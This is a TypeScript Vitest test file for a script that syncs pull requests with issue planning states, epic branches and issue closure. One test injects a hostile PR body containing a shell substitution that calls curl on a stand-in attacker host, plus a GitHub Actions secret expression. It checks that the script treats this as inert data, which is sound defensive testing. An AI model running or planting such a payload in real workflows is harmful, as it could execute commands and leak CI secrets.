import { describe, expect, it, vi } from 'vitest'

import type {
  IssueReference,
  PullRequestReference,
} from '../scripts/project-management/issue-planning.ts'
import type {
  NormalizedPlanningRecord,
  PlanningConvergenceInput,
  PlanningRecordInput,
  PlanningRecordReport,
} from '../scripts/project-management/planning-record.ts'
import {
  reconcilePullRequestPlanning,
  reconcileReopenedIssuePlanning,
  type IssueCompletionPort,
  type PlanningRecordReconcilerPort,
  type PullRequestPlanningPort,
} from '../scripts/project-management/pull-request-planning.ts'
import type {
  PullRequestBodySnapshot,
  PullRequestSnapshot,
} from '../scripts/project-management/pull-request-relationships.ts'

interface FakePlanningState {
  issueState?: 'OPEN' | 'CLOSED'
  membership?: 'missing' | 'present' | 'archived'
  kindLabel?: 'kind:epic' | 'kind:feature'
  status?: string | null
  parent?: IssueReference | null
  linkedPullRequests?: PullRequestReference[]
  failure?: Error
}

function pullRequest(overrides: Partial<PullRequestSnapshot> = {}): PullRequestSnapshot {
  return {
    repository: 'jarmak-personal/hvir',
    number: 186,
    state: 'OPEN',
    isDraft: false,
    baseRefName: 'main',
    headRefName: 'agent/issue-10',
    body: '',
    closingIssues: [],
    ...overrides,
  }
}

function pullRequestPort(
  snapshot: PullRequestSnapshot,
  openPullRequests: PullRequestBodySnapshot[] = [],
  epicBranches: string[] = [],
): PullRequestPlanningPort {
  return {
    getPullRequest: vi.fn().mockResolvedValue(snapshot),
    listOpenPullRequestBodies: vi.fn().mockResolvedValue(openPullRequests),
    listEpicBranches: vi.fn().mockResolvedValue(epicBranches),
  }
}

function planningPort(inputStates: Record<number, FakePlanningState>): {
  port: PlanningRecordReconcilerPort
  states: Map<number, FakePlanningState>
} {
  const states = new Map(
    Object.entries(inputStates).map(([number, state]) => [Number(number), { ...state }]),
  )
  const inspect = (issueNumber: number): PlanningRecordReport => {
    const state = states.get(issueNumber)
    if (state === undefined) throw new Error(`Issue #${issueNumber} was not found.`)
    if (state.failure !== undefined) throw state.failure
    return report(planningRecord(state, issueNumber))
  }
  return {
    states,
    port: {
      reconcile: vi
        .fn()
        .mockImplementation((input: PlanningRecordInput) =>
          Promise.resolve(inspect(input.issueNumber)),
        ),
      converge: vi.fn().mockImplementation((input: PlanningConvergenceInput) => {
        const state = states.get(input.issueNumber)
        if (state === undefined) {
          return Promise.reject(new Error(`Issue #${input.issueNumber} was not found.`))
        }
        if (state.failure !== undefined) return Promise.reject(state.failure)
        const before = state.status ?? null
        const target =
          state.issueState === 'CLOSED'
            ? 'Done'
            : input.active
              ? 'In Progress'
              : before === null || before === 'Done'
                ? 'Todo'
                : undefined
        const operations: PlanningRecordReport['operations'] = []
        if (state.membership !== 'present') {
          operations.push({
            operation: 'ensure-project',
            outcome: input.apply ? 'added' : 'would-add',
          })
          if (input.apply) state.membership = 'present'
        }
        if (target !== undefined) {
          const outcome =
            before === target ? 'unchanged' : input.apply ? 'updated' : 'would-update'
          operations.push({ operation: 'set-status', outcome, from: before, to: target })
          if (input.apply && outcome === 'updated') state.status = target
        }
        return Promise.resolve({
          ...report(planningRecord(state, input.issueNumber)),
          apply: input.apply,
          applied: operations.some((operation) =>
            ['added', 'restored', 'updated'].includes(operation.outcome),
          ),
          operations,
        })
      }),
    },
  }
}

function completionPort(states: Map<number, FakePlanningState>): IssueCompletionPort {
  return {
    closeIssue: vi.fn().mockImplementation((issueNumber: number) => {
      const state = states.get(issueNumber)
      if (state === undefined) return Promise.reject(new Error('missing issue'))
      state.issueState = 'CLOSED'
      return Promise.resolve()
    }),
  }
}

describe('pull request planning lifecycle', () => {
  it('advances ordinary completion and contribution targets through normal convergence', async () => {
    const pullRequests = pullRequestPort(
      pullRequest({
        isDraft: true,
        body: 'Contributes-to: #11',
        closingIssues: [issueReference(10)],
      }),
      [openPullRequest(186, 'main', 'Contributes-to: #11')],
    )
    const planning = planningPort({
      10: { status: 'Todo' },
      11: { membership: 'missing', status: null },
    })

    const result = await reconcilePullRequestPlanning(
      pullRequests,
      planning.port,
      completionPort(planning.states),
      { pullRequestNumber: 186, apply: false },
    )

    expect(result.targets).toEqual([
      expect.objectContaining({ issueNumber: 10, outcome: 'would-advance' }),
      expect.objectContaining({ issueNumber: 11, outcome: 'would-advance' }),
    ])
    expect(planning.port.converge).toHaveBeenCalledWith({
      issueNumber: 11,
      active: true,
      apply: false,
    })
    expect(result.summary).toMatchObject({ wouldAdvance: 2, errors: 0 })
  })

  it('derives one parent epic and validates the exact base for an open child PR', async () => {
    const body = 'Completes-child: #10'
    const pullRequests = pullRequestPort(
      pullRequest({
        baseRefName: 'epic/50-project-delivery',
        headRefName: 'agent/issue-10',
        body,
      }),
      [openPullRequest(186, 'epic/50-project-delivery', body)],
      ['epic/50-project-delivery'],
    )
    const planning = planningPort({
      10: { status: 'Todo', parent: issueReference(50) },
      50: { status: 'Todo', kindLabel: 'kind:epic' },
    })

    const result = await reconcilePullRequestPlanning(
      pullRequests,
      planning.port,
      completionPort(planning.states),
      { pullRequestNumber: 186, apply: false },
    )

    expect(result.completingChild).toEqual({
      issueNumber: 10,
      parentIssueNumber: 50,
      expectedBase: 'epic/50-project-delivery',
      validation: 'valid',
      closure: 'not-applicable',
    })
    expect(result.targets).toEqual([
      expect.objectContaining({
        issueNumber: 10,
        relationships: ['child-completion'],
        outcome: 'would-advance',
      }),
      expect.objectContaining({
        issueNumber: 50,
        relationships: ['parent-epic'],
        outcome: 'would-advance',
      }),
    ])
  })

  it('closes a direct child after its merged PR passes parent and base validation', async () => {
    const pullRequests = pullRequestPort(
      pullRequest({
        state: 'MERGED',
        baseRefName: 'epic/50-project-delivery',
        body: 'Completes-child: #10',
      }),
      [],
      ['epic/50-project-delivery'],
    )
    const planning = planningPort({
      10: { status: 'In Progress', parent: issueReference(50) },
      50: { status: 'In Progress', kindLabel: 'kind:epic' },
    })
    const completion = completionPort(planning.states)

    const result = await reconcilePullRequestPlanning(
      pullRequests,
      planning.port,
      completion,
      { pullRequestNumber: 186, apply: true },
    )

    expect(completion.closeIssue).toHaveBeenCalledWith(10)
    expect(result.completingChild?.closure).toBe('closed')
    expect(planning.states.get(10)).toMatchObject({
      issueState: 'CLOSED',
      status: 'Done',
    })
    expect(result.applied).toBe(true)
  })

  it.each([
    {
      name: 'wrong base',
      branches: ['epic/50-project-delivery'],
      base: 'main',
      diagnostic: 'base-mismatch',
    },
    {
      name: 'ambiguous branch',
      branches: ['epic/50-first', 'epic/50-second'],
      base: 'epic/50-first',
      diagnostic: 'ambiguous-epic-branch',
    },
  ])('leaves the child open for $name validation', async (fixture) => {
    const pullRequests = pullRequestPort(
      pullRequest({
        state: 'MERGED',
        baseRefName: fixture.base,
        body: 'Completes-child: #10',
      }),
      [],
      fixture.branches,
    )
    const planning = planningPort({
      10: { status: 'In Progress', parent: issueReference(50) },
      50: { status: 'In Progress', kindLabel: 'kind:epic' },
    })
    const completion = completionPort(planning.states)

    const result = await reconcilePullRequestPlanning(
      pullRequests,
      planning.port,
      completion,
      { pullRequestNumber: 186, apply: true },
    )

    expect(completion.closeIssue).not.toHaveBeenCalled()
    expect(planning.states.get(10)?.issueState).not.toBe('CLOSED')
    expect(result.completingChild).toMatchObject({ validation: 'failed' })
    expect(result.diagnostics.map((diagnostic) => diagnostic.code)).toContain(
      fixture.diagnostic,
    )
  })

  it('rejects a native parent that is not one open epic', async () => {
    const pullRequests = pullRequestPort(
      pullRequest({
        state: 'MERGED',
        baseRefName: 'epic/50-project-delivery',
        body: 'Completes-child: #10',
      }),
      [],
      ['epic/50-project-delivery'],
    )
    const planning = planningPort({
      10: { status: 'In Progress', parent: issueReference(50) },
      50: { status: 'In Progress', kindLabel: 'kind:feature' },
    })
    const completion = completionPort(planning.states)

    const result = await reconcilePullRequestPlanning(
      pullRequests,
      planning.port,
      completion,
      { pullRequestNumber: 186, apply: true },
    )

    expect(completion.closeIssue).not.toHaveBeenCalled()
    expect(result.diagnostics).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ code: 'parent-not-epic', issueNumber: 50 }),
      ]),
    )
  })

  it('treats an already closed child as an idempotent merged-event replay', async () => {
    const pullRequests = pullRequestPort(
      pullRequest({
        state: 'MERGED',
        baseRefName: 'epic/50-project-delivery',
        body: 'Completes-child: #10',
      }),
      [],
      ['epic/50-project-delivery'],
    )
    const planning = planningPort({
      10: {
        issueState: 'CLOSED',
        status: 'Done',
        parent: issueReference(50),
      },
      50: { status: 'In Progress', kindLabel: 'kind:epic' },
    })
    const completion = completionPort(planning.states)

    const result = await reconcilePullRequestPlanning(
      pullRequests,
      planning.port,
      completion,
      { pullRequestNumber: 186, apply: true },
    )

    expect(completion.closeIssue).not.toHaveBeenCalled()
    expect(result.completingChild?.closure).toBe('unchanged')
    expect(result.summary.errors).toBe(0)
  })

  it('defers merged native completion while preserving contributed work', async () => {
    const pullRequests = pullRequestPort(
      pullRequest({
        state: 'MERGED',
        body: 'Contributes-to: #11',
        closingIssues: [issueReference(10)],
      }),
    )
    const planning = planningPort({ 11: { status: 'Todo' } })

    const result = await reconcilePullRequestPlanning(
      pullRequests,
      planning.port,
      completionPort(planning.states),
      { pullRequestNumber: 186, apply: true },
    )

    expect(result.targets).toEqual([
      {
        issueNumber: 10,
        relationships: ['closing'],
        outcome: 'unchanged',
        reason: 'completion-merge-deferred',
      },
      expect.objectContaining({ issueNumber: 11, outcome: 'advanced' }),
    ])
  })

  it('reports hostile malformed metadata as data while applying valid targets', async () => {
    const hostile = '$(curl attacker.invalid) `${{ secrets.HVIR_PROJECT_TOKEN }}`'
    const pullRequests = pullRequestPort(
      pullRequest({
        body: [
          'Contributes-to: #10',
          'Contributes-to: owner/repository#12',
          hostile,
        ].join('\n'),
      }),
      [openPullRequest(186, 'main', 'Contributes-to: #10')],
    )
    const planning = planningPort({ 10: { status: 'Todo' } })

    const result = await reconcilePullRequestPlanning(
      pullRequests,
      planning.port,
      completionPort(planning.states),
      { pullRequestNumber: 186, apply: true },
    )

    expect(result.targets[0]).toMatchObject({ issueNumber: 10, outcome: 'advanced' })
    expect(result.summary.errors).toBe(1)
    expect(JSON.stringify(result)).not.toContain(hostile)
  })

  it('recomputes contribution and completing-child activity when an issue reopens', async () => {
    const pullRequests = pullRequestPort(pullRequest(), [
      openPullRequest(190, 'epic/50-project-delivery', 'Completes-child: #10'),
    ])
    const planning = planningPort({ 10: { status: 'Todo' } })

    const result = await reconcileReopenedIssuePlanning(pullRequests, planning.port, {
      repository: 'jarmak-personal/hvir',
      issueNumber: 10,
      apply: true,
    })

    expect(result.target).toMatchObject({
      issueNumber: 10,
      outcome: 'advanced',
      reason: 'active-relationship',
      statusAfter: 'In Progress',
    })
  })
})

function report(record: NormalizedPlanningRecord): PlanningRecordReport {
  return { apply: false, applied: false, record, operations: [] }
}

function planningRecord(
  state: FakePlanningState,
  issueNumber: number,
): NormalizedPlanningRecord {
  const kindLabel = state.kindLabel ?? 'kind:feature'
  const kindOption = kindLabel === 'kind:epic' ? 'Epic' : 'Feature'
  return {
    repository: 'jarmak-personal/hvir',
    issue: {
      number: issueNumber,
      state: state.issueState ?? 'OPEN',
      kind: {
        state: 'valid',
        label: kindLabel,
        option: kindOption,
        recognizedLabels: [kindLabel],
      },
      areas: [],
      parent: state.parent ?? null,
      subIssues: [],
      linkedPullRequests: state.linkedPullRequests ?? [],
    },
    project: {
      membership: state.membership ?? 'present',
      kind: kindOption,
      status: state.status ?? null,
    },
  }
}

function issueReference(
  number: number,
  repository = 'jarmak-personal/hvir',
): IssueReference {
  return { repository, number, state: 'OPEN' }
}

function openPullRequest(
  number: number,
  baseRefName: string,
  body: string,
): PullRequestBodySnapshot {
  return {
    repository: 'jarmak-personal/hvir',
    number,
    baseRefName,
    headRefName: `agent/pr-${number}`,
    body,
  }
}
